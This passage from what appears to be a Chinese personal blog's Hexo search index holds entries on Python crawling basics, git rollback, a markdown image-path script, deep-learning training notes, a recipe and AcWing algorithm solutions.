src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/120.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/121.png"><br>共享队列<br>缓冲区的空余数<br>缓冲区的占有数<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/122.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/123.png"><br>直接用list没用，不同进程访问不到，只能用这个Queue<br>试试往Queue里放入随机数据，看看效果<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/124.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/125.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/126.png"><br>这样就可以通过Queue实现数据共享了</p><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/127.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/128.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/129.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/130.png"></p><h3 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/131.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/132.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/133.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/134.png"><br>生成了一个大小为3的进程池，不指定则根据处理器的内核数量自动分配<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/135.png"><br>执行完了前三个进程才开始第四个<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/136.png">​<br>最后用close方法关闭进程池，使其不再接收新的任务，再调用join方法让主进程等待子进程的退出</p><h4 id="简化写法"><a href="#简化写法" class="headerlink" title="简化写法"></a>简化写法</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/137.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/138.png"><br>自动创建进程<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/139.png"></p><h2 id="第07讲：入门首选，-Requests-库的基本使用"><a href="#第07讲：入门首选，-Requests-库的基本使用" class="headerlink" title="第07讲：入门首选， Requests 库的基本使用"></a>第07讲：入门首选， Requests 库的基本使用</h2><p>  学习爬虫最基础的便是模拟浏览器向服务器发出请求<br>  利用 Python现有的库可以非常方便地实现网络请求的模拟常见的库有 urllib、 requests 等</p><h3 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/140.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/141.png"><br>用 Python 写爬虫的第一步就是模拟发起一个请求 把网页的源代码获取下来<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/142.png"><br>   <img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/143.png"></p><h4 id="get请求"><a href="#get请求" class="headerlink" title="get请求"></a>get请求</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/144.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/145.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/146.png"><br>可以这么写，但是不太好<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/147.png"><br>这么写好<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/148.png"><br>结果：<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/149.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/150.png"><br>讲json格式的文件直接转换成字典<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/151.png"></p><h4 id="加上提取信息的逻辑"><a href="#加上提取信息的逻辑" class="headerlink" title="加上提取信息的逻辑"></a>加上提取信息的逻辑</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/152.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/153.png"></p><h5 id="抓取图片等"><a href="#抓取图片等" class="headerlink" title="抓取图片等"></a>抓取图片等</h5><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/154.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/155.png"></p><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/156.png"></p><ul><li>with表达式其实是try-finally的简写形式。但是又不是全相同。with本身并没有异常捕获的功能，但是如果发生了运行时异常，它照样可以关闭文件释放资源。</li><li>wb表示二进制</li></ul><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/157.png"></p>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git_回滚</title>
      <link href="/2021/07/26/git_%E5%9B%9E%E6%BB%9A/"/>
      <url>/2021/07/26/git_%E5%9B%9E%E6%BB%9A/</url>
      
        <content type="html"><![CDATA[<p><strong>进入本地项目文件夹</strong></p><ul><li>git init</li><li>git log</li><li>ctrl+z退出</li><li>git reset –hard 3bfd4447d2333d6cc12ea22cb89265784a9c8954</li><li>git push -f origin master</li></ul><p>​</p>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>语雀markdown图片路径转换_for_hexo</title>
      <link href="/2021/07/23/%E8%AF%AD%E9%9B%80markdown%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%BD%AC%E6%8D%A2_for_hexo/"/>
      <url>/2021/07/23/%E8%AF%AD%E9%9B%80markdown%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%BD%AC%E6%8D%A2_for_hexo/</url>
      
        <content type="html"><![CDATA[<p>  大家好，我是go有鸡！在使用语雀写博客的时候，导出的md文件里的图片路径往往不能在hexo博客中正常直接展示，需要逐个替换成本地路径才可以显示，这太麻烦了！<br>  依噶，用这个脚本，只要简简单单的两步配置，就能将图片路径自动转换成本地图片路径！<br><strong>示例：</strong>go有鸡想把 Python正则表达式入门 这篇博文从语雀上导出到了/hexoblog/source/posts目录下，他长这样：<br><img src="/medias/%E8%AF%AD%E9%9B%80markdown%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%BD%AC%E6%8D%A2_for_hexo/image.png">，<br>文件内部：<br><img src="/medias/%E8%AF%AD%E9%9B%80markdown%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%BD%AC%E6%8D%A2_for_hexo/image-1.png">，可以看到，里面的图片链接都是语雀自动生成的图片链接，现在go有鸡要把他们转换成可以放在hexo博客上展示的本地链接！<br>第一步：在主题文件夹下的medias文件夹下创建一个和欲转换md文件同名的文件夹：<br><img src="/medias/%E8%AF%AD%E9%9B%80markdown%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%BD%AC%E6%8D%A2_for_hexo/image-2.png"><br>并将图片从语雀上的文章中按顺序拖进去：<img src="/medias/%E8%AF%AD%E9%9B%80markdown%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%BD%AC%E6%8D%A2_for_hexo/image-3.png">，<br>可以看到图片都被按顺序的自动命名了。<br>第二步：打开rego_publish.py,（第一次使用需要将workpath设置为_post文件夹所在的绝对路径，这样后续使用则无需再次设置workpath），将主函数中的top修改为’Python正则表达式入门.md’,之后运行，可以看到md文件中的路径都被替换成了本地路径：<br><img src="/medias/%E8%AF%AD%E9%9B%80markdown%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%BD%AC%E6%8D%A2_for_hexo/image-4.png">。<br>是不是很方便呢？来，试试看！</p><p>下载地址：<a href="https://github.com/snowgo/yuque-markdown-_for_hexo">https://github.com/snowgo/yuque-markdown-_for_hexo</a></p>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最好的BERT教程</title>
      <link href="/2021/07/11/%E6%9C%80%E5%A5%BD%E7%9A%84BERT%E6%95%99%E7%A8%8B/"/>
      <url>/2021/07/11/%E6%9C%80%E5%A5%BD%E7%9A%84BERT%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><a href="https://leemeng.tw/attack_on_bert_transfer_learning_in_nlp.html#">https://leemeng.tw/attack_on_bert_transfer_learning_in_nlp.html#</a><br><img src="https://cdn.nlark.com/yuque/0/2021/png/21769886/1625975915070-1c97daa4-06d1-4510-84bb-cd137870ae25.png#clientId=u842dc2cf-55c6-4&from=paste&height=901&id=u0a0564ba&margin=%5Bobject%20Object%5D&name=image.png&originHeight=901&originWidth=1525&originalType=binary&ratio=1&size=3205271&status=done&style=none&taskId=uf4ac3163-6261-4937-a372-7944dbb90b7&width=1525" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>验证集参与训练了吗</title>
      <link href="/2021/07/11/%E9%AA%8C%E8%AF%81%E9%9B%86%E5%8F%82%E4%B8%8E%E8%AE%AD%E7%BB%83%E4%BA%86%E5%90%97%EF%BC%9F/"/>
      <url>/2021/07/11/%E9%AA%8C%E8%AF%81%E9%9B%86%E5%8F%82%E4%B8%8E%E8%AE%AD%E7%BB%83%E4%BA%86%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>从《机器学习》这本书中，我们知道，训练集是拿来训练模型参数的，对于所有的训练集，训练一个epoch之后，我们会用验证集来测试一下模型在上面的性能，由于训练集和验证集的不可交性，所以在验证集上面的结果是有参考意义的。<br>但是重点是：</p><ol><li>验证集并没有参与训练过程梯度下降过程的，狭义上来讲是没有参与模型的参数训练更新的。</li><li>但是广义上来讲，验证集存在的意义确实参与了一个“人工调参”的过程，我们根据每一个epoch训练之后模型在valid data上的表现来决定是否需要训练进行early stop，或者根据这个过程模型的性能变化来调整模型的超参数，如学习率，batchsize等等。</li><li>因此，我们也可以认为，验证集也参与了训练，但是并没有使得模型去overfit验证集<br>那为什么还需要测试集？<br>既然验证集参与了一个“人工调参”的过程，那么就还需要一个<strong>完全没有经过训练的集合，那就是测试集，我们既不用测试集梯度下降，也不用它来控制超参数，只是在模型最终训练完成后，用来测试一下最后准确率，确定模型的泛化能力强弱。</strong></li></ol>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【调优方法】——warmup</title>
      <link href="/2021/07/08/%E3%80%90%E8%B0%83%E4%BC%98%E6%96%B9%E6%B3%95%E3%80%91%E2%80%94%E2%80%94warmup/"/>
      <url>/2021/07/08/%E3%80%90%E8%B0%83%E4%BC%98%E6%96%B9%E6%B3%95%E3%80%91%E2%80%94%E2%80%94warmup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>学习率是模型训练中最重要的超参之一，针对学习率的优化有很多种方法，而warmup是其中重要的一种。</p></blockquote><h1 id="什么是warmup"><a href="#什么是warmup" class="headerlink" title="什么是warmup"></a>什么是warmup</h1><p>warmup是一种学习率优化方法（最早出现在ResNet论文中）。在模型训练之初选用较小的学习率，训练一段时间之后（如：10epoches或10000steps）使用预设的学习率进行训练； </p><h1 id="为什么使用warmup"><a href="#为什么使用warmup" class="headerlink" title="为什么使用warmup"></a>为什么使用warmup</h1><h2 id="理性分析"><a href="#理性分析" class="headerlink" title="理性分析"></a>理性分析</h2><p>因为模型的weights是随机初始化的，可以理解为训练之初模型对数据的“理解程度”为0（即：没有任何先验知识），在第一个epoches中，每个batch的数据对模型来说都是新的，模型会根据输入的数据进行快速调参，此时如果采用较大的学习率的话，有很大的可能使模型对于数据“过拟合”（“学偏”），后续需要更多的轮次才能“拉回来”；<br>当模型训练一段时间之后（如：10epoches或10000steps），模型对数据具有一定的先验知识，此时使用较大的学习率模型就不容易学“偏”，可以使用较大的学习率加速模型收敛；<br>当模型使用较大的学习率训练一段时间之后，模型的分布相对比较稳定，此时不宜从数据中再学到新特点，如果仍使用较大的学习率会破坏模型的稳定性，而使用小学习率更容易获取local optima。</p><h2 id="感性分析"><a href="#感性分析" class="headerlink" title="感性分析"></a>感性分析</h2><p>刚开始模型对数据完全不了解，这个时候步子太大，容易扯着dan，此时需要使用小学习率摸着石头过河；<br>对数据了解了一段时间之后，可以使用大学习率朝着目标大步向前；<br>快接近目标时，使用小学习率进行探索，此时步子太大，容易错过最近点； </p><h1 id="常用的warmup"><a href="#常用的warmup" class="headerlink" title="常用的warmup"></a>常用的warmup</h1><p>​</p><h2 id="Constant-Warmup"><a href="#Constant-Warmup" class="headerlink" title="Constant Warmup"></a>Constant Warmup</h2><pre><code>学习率从非常小的数值线性增加到预设值之后保持不变，其学习率的系数如下图所示： </code></pre><p><img src="https://z3.ax1x.com/2021/07/08/RLtuqg.png"></p><p>​</p><h2 id="Linner-Warmup"><a href="#Linner-Warmup" class="headerlink" title="Linner Warmup"></a>Linner Warmup</h2><p>学习率从非常小的数值线性增加到预设值之后，然后再线性减小。其学习率的系数如下图所示。<br><img src="https://z3.ax1x.com/2021/07/08/RLtrJ1.png"></p><p>​</p><h2 id="Cosine-Warmup"><a href="#Cosine-Warmup" class="headerlink" title="Cosine Warmup"></a>Cosine Warmup</h2><p>学习率先从很小的数值线性增加到预设学习率，然后按照cos函数值进行衰减。其学习率系数如下图所示。<br><img src="https://z3.ax1x.com/2021/07/08/RLtqOS.png"><br>​</p><blockquote><p>转自<a href="https://blog.csdn.net/dendi_hust/article/details/104465337">https://blog.csdn.net/dendi_hust/article/details/104465337</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>醋溜饹馇做法</title>
      <link href="/2021/07/08/%E9%86%8B%E6%BA%9C%E9%A5%B9%E9%A6%87%E5%81%9A%E6%B3%95/"/>
      <url>/2021/07/08/%E9%86%8B%E6%BA%9C%E9%A5%B9%E9%A6%87%E5%81%9A%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>​</p><h1 id="饹馇"><a href="#饹馇" class="headerlink" title="饹馇"></a>饹馇</h1><p>面粉<br>绿豆粉<br>鸡蛋<br>生菜/蒜黄<br>蒜<br>醋10ml<br>酱油10ml<br>白糖4-5g<br>味精1.5g</p><h1 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h1><h2 id="制作饹馇"><a href="#制作饹馇" class="headerlink" title="制作饹馇"></a>制作饹馇</h2><p>平底锅加油，放入面粉绿豆粉鸡蛋*2的混合物<br>​</p><h2 id="剩下的步骤"><a href="#剩下的步骤" class="headerlink" title="剩下的步骤"></a>剩下的步骤</h2><p>起锅烧油放蒜<br>加生菜进去炒炒<br>加调料（除味精<br>饹馇放进去炒炒<br>关火放味精<br>​</p><p>来，试试看</p>]]></content>
      
      
      <categories>
          
          <category> 料理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中国料理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021AcWing每日一题·暑假</title>
      <link href="/2021/07/06/2021AcWing%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%C2%B7%E6%9A%91%E5%81%87/"/>
      <url>/2021/07/06/2021AcWing%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%C2%B7%E6%9A%91%E5%81%87/</url>
      
        <content type="html"><![CDATA[<h1 id="3761-唯一最小数"><a href="#3761-唯一最小数" class="headerlink" title="3761. 唯一最小数"></a>3761. 唯一最小数</h1><p>给定一个长度为 n 的整数数组 a1,a2,…,ana1,a2,…,an。<br>请你找到数组中只出现过一次的数当中最小的那个数。<br>输出找到的数的<strong>索引编号</strong>。<br>a1 的索引编号为 1，a2 的索引编号为 2，…，an 的索引编号为 n。</p><h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行包含整数 T，表示共有 T 组测试数据。<br>每组数据第一行包含整数 nn。<br>第二行包含 nn 个整数 a1,a2,…,ana1,a2,…,an。</p><h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>每组数据输出一行结果，即满足条件的数的索引编号，如果不存在满足条件的数，则输出 −1−1。</p><h4 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤T≤2×1041≤T≤2×104,<br>1≤n≤2×1051≤n≤2×105,<br>1≤ai≤n1≤ai≤n,<br>同一测试点内的所有 nn 的和不超过 2×1052×105。</p><h4 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h4><p>6<br>2<br>1 1<br>3<br>2 1 3<br>4<br>2 2 2 3<br>1<br>1<br>5<br>2 3 2 4 2<br>6<br>1 1 5 5 4 4 </p><h4 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h4><p>-1 2 4 1 2 -1</p><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">input</span>())):</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line">    temp = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">    dic = &#123;j : i <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(temp)&#125;</span><br><span class="line">    Dic = collections.Counter(temp)</span><br><span class="line"></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> Dic.items():</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">1</span>:</span><br><span class="line">            res.append(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">        <span class="built_in">print</span>(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(dic[<span class="built_in">min</span>(res)]+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">讲解：</span><br><span class="line">读取输入:<span class="built_in">input</span>()</span><br><span class="line"><span class="built_in">map</span>函数:<span class="built_in">map</span>(function,<span class="built_in">list</span>) <span class="comment">#即对list中的每一个数进行function操作</span></span><br><span class="line"><span class="built_in">enumerate</span>(temp):对temp中的每一个元素的下标和值成对取出</span><br><span class="line">dic = &#123;j : i <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(temp)&#125;:为列表生成式</span><br><span class="line">collections.Counter(temp):对列表中的元素进行计数，返回一个dic</span><br><span class="line">Dic.items():逐个返回Dic中的键值对</span><br><span class="line"><span class="built_in">min</span>(<span class="built_in">list</span>):返回<span class="built_in">list</span>中最小值</span><br></pre></td></tr></table></figure><h1 id="3762-二进制矩阵"><a href="#3762-二进制矩阵" class="headerlink" title="3762. 二进制矩阵"></a>3762. 二进制矩阵</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/21769886/1625875707267-ede60d3b-85b5-4a8d-9549-3ad3df858cc7.png#clientId=u5517ba36-6917-4&from=paste&height=824&id=u17bbd5fc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=824&originWidth=752&originalType=binary&ratio=1&size=87074&status=done&style=none&taskId=u4b2180db-7eb9-4e8b-bbb2-05023397a44&width=752" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">T = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span>(<span class="params">i1, j1, i2, j2, i3, j3</span>):</span></span><br><span class="line">        <span class="keyword">if</span> nums[i1][j1] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            nums[i1][j1] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            nums[i1][j1] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nums[i2][j2] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            nums[i2][j2] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            nums[i2][j2] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nums[i3][j3] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            nums[i3][j3] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            nums[i3][j3] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(i1+<span class="number">1</span>, j1+<span class="number">1</span>, i2+<span class="number">1</span>, j2+<span class="number">1</span>, i3+<span class="number">1</span>, j3+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(T):</span><br><span class="line">    n, m = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">    nums = []</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        tmp = <span class="built_in">list</span>(<span class="built_in">input</span>())</span><br><span class="line">        nums.append(tmp)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> tmp:</span><br><span class="line">            <span class="keyword">if</span> c == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                ans += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(ans*<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            <span class="keyword">if</span> nums[i][j] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> i + <span class="number">1</span> == n <span class="keyword">and</span> j + <span class="number">1</span> == m:</span><br><span class="line">                swap(i, j, i, j-<span class="number">1</span>, i-<span class="number">1</span>, j-<span class="number">1</span>)</span><br><span class="line">                swap(i, j, i, j-<span class="number">1</span>, i-<span class="number">1</span>, j)</span><br><span class="line">                swap(i, j, i-<span class="number">1</span>, j, i-<span class="number">1</span>, j-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> i + <span class="number">1</span> == n:</span><br><span class="line"></span><br><span class="line">                swap(i, j, i-<span class="number">1</span>, j, i-<span class="number">1</span>, j+<span class="number">1</span>)</span><br><span class="line">                swap(i, j, i-<span class="number">1</span>, j, i, j+<span class="number">1</span>)</span><br><span class="line">                swap(i, j, i, j+<span class="number">1</span>, i-<span class="number">1</span>, j+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> j + <span class="number">1</span> == m:</span><br><span class="line">                swap(i, j, i, j-<span class="number">1</span>, i+<span class="number">1</span>, j)</span><br><span class="line">                swap(i, j, i, j-<span class="number">1</span>, i+<span class="number">1</span>, j-<span class="number">1</span>)</span><br><span class="line">                swap(i, j, i+<span class="number">1</span>, j, i+<span class="number">1</span>, j-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> i + <span class="number">1</span> &lt; n <span class="keyword">and</span> j + <span class="number">1</span> &lt; m:</span><br><span class="line">                swap(i, j, i+<span class="number">1</span>, j, i, j+<span class="number">1</span>)</span><br><span class="line">                swap(i, j, i+<span class="number">1</span>, j, i+<span class="number">1</span>, j+<span class="number">1</span>)</span><br><span class="line">                swap(i, j, i, j+<span class="number">1</span>, i+<span class="number">1</span>, j+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> n, m = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">    nums = []</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        tmp = <span class="built_in">list</span>(<span class="built_in">input</span>())</span><br><span class="line">        nums.append(tmp)</span><br><span class="line">:此处为python读取矩阵数据的方法</span><br><span class="line">解题思路:任何一个‘<span class="number">1</span>’都可以通过三次L型变换变成‘<span class="number">0</span>‘，同时保证其他元素不变。另外此题不要求最优解，合理即可。</span><br></pre></td></tr></table></figure><h1 id="3763-数字矩阵"><a href="#3763-数字矩阵" class="headerlink" title="3763. 数字矩阵"></a>3763. 数字矩阵</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/21769886/1626177506700-62beb68e-2e26-474d-a1d5-a56761863f16.png#clientId=u987d9ee7-a599-4&from=paste&height=464&id=ud499b461&margin=%5Bobject%20Object%5D&name=image.png&originHeight=464&originWidth=648&originalType=binary&ratio=1&size=57926&status=done&style=none&taskId=u5164e78f-02a6-4814-8726-b0d67c7e0eb&width=648" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">T = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(T):</span><br><span class="line">    n, m = <span 